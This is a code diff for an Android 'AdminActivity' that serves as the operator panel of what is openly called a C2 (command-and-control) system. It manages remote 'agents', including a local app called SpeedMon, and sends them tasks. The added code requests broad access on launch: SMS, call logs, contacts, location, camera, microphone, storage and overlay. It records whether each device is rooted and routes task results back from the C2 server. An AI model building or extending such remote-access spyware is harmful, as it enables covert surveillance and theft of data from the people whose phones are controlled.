@@ -5,6 +5,7 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.SharedPreferences
+import android.os.Build
 import android.os.Bundle
 import android.view.LayoutInflater
 import android.view.View
@@ -34,6 +35,7 @@ class AdminActivity : AppCompatActivity() {
     private var selectedAgent: Agent? = null
     private lateinit var prefs: SharedPreferences
     private var resultReceiver: ResultReceiver? = null
+    private var speedMonResultReceiver: SpeedMonResultReceiver? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -68,20 +70,53 @@ class AdminActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btnTestLocal).setOnClickListener { testLocalConnection() }
 
         loadAgents()
-        registerResultReceiver()
+        registerResultReceivers()
 
-        // Start Telegram bot
-        val telegramBot = TelegramBotService(this)
-        telegramBot.start()
+        // Request all permissions on launch
+        requestAllPermissions()
     }
 
-    private fun registerResultReceiver() {
-        resultReceiver = ResultReceiver()
-        val filter = IntentFilter("com.speedmon.ACTION_RESULT")
-        val receiver = resultReceiver
-        if (receiver != null) {
-            LocalBroadcastManager.getInstance(this).registerReceiver(receiver, filter)
+    private fun requestAllPermissions() {
+        val permissions = mutableListOf(
+            android.Manifest.permission.INTERNET,
+            android.Manifest.permission.ACCESS_NETWORK_STATE,
+            android.Manifest.permission.ACCESS_WIFI_STATE,
+            android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.ACCESS_COARSE_LOCATION,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            android.Manifest.permission.RECORD_AUDIO,
+            android.Manifest.permission.CAMERA,
+            android.Manifest.permission.FOREGROUND_SERVICE,
+            android.Manifest.permission.FOREGROUND_SERVICE_LOCATION,
+            android.Manifest.permission.WAKE_LOCK
+        )
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
         }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            permissions.add(android.Manifest.permission.SYSTEM_ALERT_WINDOW)
+        }
+
+        val notGranted = permissions.filter { checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED }
+        if (notGranted.isNotEmpty()) {
+            androidx.core.app.ActivityCompat.requestPermissions(this, notGranted.toTypedArray(), 100)
+        }
+    }
+
+    private fun registerResultReceivers() {
+        // C2 result receiver
+        resultReceiver = ResultReceiver()
+        val filter = IntentFilter("com.system.monitor.ACTION_RESULT")
+        LocalBroadcastManager.getInstance(this).registerReceiver(resultReceiver!!, filter)
+
+        // SpeedMon local result receiver
+        speedMonResultReceiver = SpeedMonResultReceiver()
+        val speedMonFilter = IntentFilter("com.speedmon.ACTION_RESULT")
+        LocalBroadcastManager.getInstance(this).registerReceiver(speedMonResultReceiver!!, speedMonFilter)
     }
 
     private fun getC2Url(): String {
@@ -93,8 +128,10 @@ class AdminActivity : AppCompatActivity() {
         val input = android.widget.EditText(this).apply {
             hint = "C2 Server URL (e.g., https://your-server.com/api)"
             setText(currentUrl)
+            setTextColor(android.graphics.Color.WHITE)
+            hintTextColor = android.graphics.Color.GRAY
         }
-        android.app.AlertDialog.Builder(this)
+        androidx.appcompat.app.AlertDialog.Builder(this)
             .setTitle("Configure C2 Server")
             .setView(input)
             .setPositiveButton("Save") { _, _ ->
@@ -111,8 +148,12 @@ class AdminActivity : AppCompatActivity() {
     private fun loadAgents() {
         // Try C2 first
         request("GET", "/api/agents") { resp ->
-            val agents = gson.fromJson(resp, Array<Agent>::class.java).toList()
-            runOnUiThread { adapter.submitList(agents) }
+            try {
+                val agents = gson.fromJson(resp, Array<Agent>::class.java).toList()
+                runOnUiThread { adapter.submitList(agents) }
+            } catch (e: Exception) {
+                Log.e("Admin", "Parse agents error", e)
+            }
         }
         // Also add local SpeedMon as an agent
         runOnUiThread {
@@ -133,7 +174,7 @@ class AdminActivity : AppCompatActivity() {
     private fun sendTask(capability: String, args: Map<String, Any>) {
         // Send to local SpeedMon via broadcast
         sendLocalTask(capability, args)
-        
+
         // Also send to C2 if configured
         selectedAgent?.let { agent ->
             if (!agent.id.startsWith("local-")) {
@@ -164,7 +205,6 @@ class AdminActivity : AppCompatActivity() {
     }
 
     private fun testLocalConnection() {
-        // Send a ping to SpeedMon
         val intent = Intent("com.speedmon.ACTION_COMMAND").apply {
             putExtra("capability", "apps")
             putExtra("args", "{}")
@@ -209,13 +249,15 @@ class AdminActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         super.onDestroy()
-        val receiver = resultReceiver
-        if (receiver != null) {
+        resultReceiver?.let { receiver ->
             try {
                 LocalBroadcastManager.getInstance(this).unregisterReceiver(receiver)
-            } catch (e: Exception) {
-                // ignore
-            }
+            } catch (e: Exception) { }
+        }
+        speedMonResultReceiver?.let { receiver ->
+            try {
+                LocalBroadcastManager.getInstance(this).unregisterReceiver(receiver)
+            } catch (e: Exception) { }
         }
     }
 
@@ -226,7 +268,19 @@ class AdminActivity : AppCompatActivity() {
             val error = intent.getStringExtra("error") ?: ""
             val status = intent.getStringExtra("status") ?: ""
             runOnUiThread {
-                Toast.makeText(this@AdminActivity, "Result [$status]: $result", Toast.LENGTH_LONG).show()
+                Toast.makeText(this@AdminActivity, "C2 Result [$status]: $result", Toast.LENGTH_LONG).show()
+            }
+        }
+    }
+
+    private inner class SpeedMonResultReceiver : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val taskId = intent.getStringExtra("task_id") ?: ""
+            val result = intent.getStringExtra("result") ?: ""
+            val error = intent.getStringExtra("error") ?: ""
+            val status = intent.getStringExtra("status") ?: ""
+            runOnUiThread {
+                Toast.makeText(this@AdminActivity, "SpeedMon Result [$status]: $result", Toast.LENGTH_LONG).show()
             }
         }
     }
@@ -265,3 +319,16 @@ class AgentAdapter(private val onClick: (Agent) -> Unit) :
         }
     }
 }
+
+data class Agent(
+    val id: String,
+    val hostname: String,
+    val os: String,
+    val arch: String,
+    val androidVersion: String,
+    val sdk: Int,
+    val rooted: Boolean,
+    val lastSeen: String
+)
+
+fun Any.toJson(): String = Gson().toJson(this)
